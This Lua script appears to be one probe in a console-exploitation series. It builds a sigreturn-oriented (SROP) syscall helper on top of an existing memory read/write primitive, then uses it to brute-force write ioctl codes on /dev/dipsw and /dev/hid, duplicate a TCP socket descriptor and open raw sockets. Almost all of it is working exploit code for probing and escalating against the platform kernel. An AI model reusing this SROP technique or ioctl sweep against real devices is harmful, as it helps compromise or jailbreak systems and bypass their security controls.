-- CRASH_CLASS: LOW
-- PROBE 132c: dipsw ioctl write sweep + hid ioctl + broader device scan
--
-- 132b confirmed dipsw READ ioctl works (0x40048806/07 both return 0).
-- Now sweep for the WRITE ioctl code. Also test hid ioctl via SROP.

print("=== PROBE 132c: DIPSW WRITE SWEEP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x8000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local P = gpu
local B = gpu + 0x100
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end

--------------------------------------------------------------------
-- SECTION A: dipsw ioctl comprehensive sweep
--------------------------------------------------------------------
print("")
print("--- [A] dipsw ioctl sweep ---")
ws(P, "/dev/dipsw")
local fd_dip = to_num(srop(5, P, uint64(0)))
print("[A] dipsw fd=" .. fd_dip)

if fd_dip > 0 and fd_dip < 256 then
    -- Confirm reads still work
    memory.write_dword(B, 0x42424242)
    local rv_rd = srop(54, uint64(fd_dip), uint64(0x40048806), B)
    print("[A] read ioctl(0x40048806)=" .. hex(rv_rd) .. " val=" .. to_num(memory.read_dword(B)))

    -- Sweep: _IOW(0x88, num, int) = 0x80048800+num
    -- _IOW(0x88, num, long) = 0x80088800+num
    -- _IOWR(0x88, num, int) = 0xC0048800+num
    print("[A] _IOW sweep:")
    for num = 0, 15 do
        memory.write_dword(B, 1)
        local code = 0x80048800 + num
        local rv = srop(54, uint64(fd_dip), uint64(code), B)
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("  _IOW(0x88,%d,int)=0x%08X: OK!", num, code))
        end
    end

    print("[A] _IOWR sweep:")
    for num = 0, 15 do
        memory.write_dword(B, 1)
        local code = 0xC0048800 + num
        local rv = srop(54, uint64(fd_dip), uint64(code), B)
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("  _IOWR(0x88,%d,int)=0x%08X: OK!", num, code))
        end
    end

    -- Try bare ioctl (no data direction)
    print("[A] _IO sweep:")
    for num = 0, 15 do
        local code = 0x20008800 + num
        local rv = srop(54, uint64(fd_dip), uint64(code), B)
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("  _IO(0x88,%d)=0x%08X: OK!", num, code))
        end
    end

    -- Try different group: 'D' = 0x44 (device)
    print("[A] group 0x44 sweep:")
    for num = 0, 15 do
        memory.write_dword(B, 1)
        local code = 0x80044400 + num
        local rv = srop(54, uint64(fd_dip), uint64(code), B)
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("  _IOW(0x44,%d,int)=0x%08X: OK!", num, code))
        end
        code = 0x40044400 + num
        rv = srop(54, uint64(fd_dip), uint64(code), B)
        rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("  _IOR(0x44,%d,int)=0x%08X: OK!", num, code))
        end
    end

    -- Try different group: 'S' = 0x53 (Sony)
    print("[A] group 0x53 sweep:")
    for num = 0, 15 do
        memory.write_dword(B, 1)
        local code = 0x80045300 + num
        local rv = srop(54, uint64(fd_dip), uint64(code), B)
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("  _IOW(0x53,%d,int)=0x%08X: OK!", num, code))
        end
        code = 0x40045300 + num
        rv = srop(54, uint64(fd_dip), uint64(code), B)
        rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("  _IOR(0x53,%d,int)=0x%08X: OK!", num, code))
        end
    end

    srop(6, uint64(fd_dip))
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: Try reading individual dipsw values (switch 0-255)
--------------------------------------------------------------------
print("")
print("--- [B] dipsw read values ---")
ws(P, "/dev/dipsw")
fd_dip = to_num(srop(5, P, uint64(0)))
if fd_dip > 0 and fd_dip < 256 then
    -- Read cmd 6 with different input values
    for sw = 0, 7 do
        memory.write_dword(B, sw)
        local rv = srop(54, uint64(fd_dip), uint64(0x40048806), B)
        local val = to_num(memory.read_dword(B))
        print(string.format("[B] cmd6 sw[%d]=%d (0x%X)", sw, val, val))
    end

    -- Read cmd 7 with different input values
    for sw = 0, 7 do
        memory.write_dword(B, sw)
        local rv = srop(54, uint64(fd_dip), uint64(0x40048807), B)
        local val = to_num(memory.read_dword(B))
        print(string.format("[B] cmd7 sw[%d]=%d (0x%X)", sw, val, val))
    end
    srop(6, uint64(fd_dip))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: hid ioctl via SROP
--------------------------------------------------------------------
print("")
print("--- [C] hid ioctl ---")
ws(P, "/dev/hid")
local fd_hid = to_num(srop(5, P, uint64(2)))
print("[C] hid fd=" .. fd_hid)

if fd_hid > 0 and fd_hid < 256 then
    -- Sony HID ioctl: group 0x74 = 't'
    for num = 0, 20 do
        memory.write_qword(B, uint64(0))
        memory.write_qword(B+8, uint64(0))
        memory.write_qword(B+0x10, uint64(0))
        memory.write_qword(B+0x18, uint64(0))
        local code = 0xC0107400 + num
        local rv = srop(54, uint64(fd_hid), uint64(code), B)
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("[C] ioctl(0x%08X)=OK data=%s", code, hex(memory.read_qword(B))))
        end
    end
    -- Try with group 0x48 = 'H' for HID
    for num = 0, 20 do
        memory.write_qword(B, uint64(0))
        memory.write_qword(B+8, uint64(0))
        local code = 0xC0104800 + num
        local rv = srop(54, uint64(fd_hid), uint64(code), B)
        local rvh, rvl = get_hi_lo(rv)
        if rvl == 0 and rvh == 0 then
            print(string.format("[C] ioctl(0x%08X)=OK data=%s", code, hex(memory.read_qword(B))))
        end
    end
    srop(6, uint64(fd_hid))
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: Try pipe(42) via SROP
--------------------------------------------------------------------
print("")
print("--- [D] pipe via SROP ---")
memory.write_dword(B, 0xFFFFFFFF)
memory.write_dword(B+4, 0xFFFFFFFF)
local rv_pipe = srop(42, B)
print("[D] pipe(42)=" .. hex(rv_pipe) .. " fds=" .. to_num(memory.read_dword(B)) .. "," .. to_num(memory.read_dword(B+4)))

-- pipe2(542)
memory.write_dword(B, 0xFFFFFFFF)
memory.write_dword(B+4, 0xFFFFFFFF)
local rv_p2 = srop(542, B, uint64(0))
print("[D] pipe2(542)=" .. hex(rv_p2) .. " fds=" .. to_num(memory.read_dword(B)) .. "," .. to_num(memory.read_dword(B+4)))

-- dup(41) fd=4 (TCP)
local rv_dup = srop(41, uint64(4))
print("[D] dup(41,4)=" .. hex(rv_dup))

-- dup2(90) fd=4 -> 30
local rv_dup2 = srop(90, uint64(4), uint64(30))
print("[D] dup2(90,4,30)=" .. hex(rv_dup2))

print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION E: Try socket(97) for more socket types
--------------------------------------------------------------------
print("")
print("--- [E] socket via SROP ---")
-- AF_LOCAL=1, SOCK_STREAM=1
local rv_unix = srop(97, uint64(1), uint64(1), uint64(0))
print("[E] socket(AF_LOCAL,STREAM)=" .. hex(rv_unix))

-- AF_INET6=28, SOCK_RAW=3
local rv_raw6 = srop(97, uint64(28), uint64(3), uint64(0))
print("[E] socket(AF_INET6,RAW)=" .. hex(rv_raw6))

-- socketpair(135) AF_LOCAL
memory.write_dword(B, 0xFFFFFFFF)
memory.write_dword(B+4, 0xFFFFFFFF)
local rv_sp = srop(135, uint64(1), uint64(1), uint64(0))
print("[E] socketpair(AF_LOCAL)=" .. hex(rv_sp))

print("[E] pid=" .. to_num(sc20()))

print("")
print("=== DONE ===")
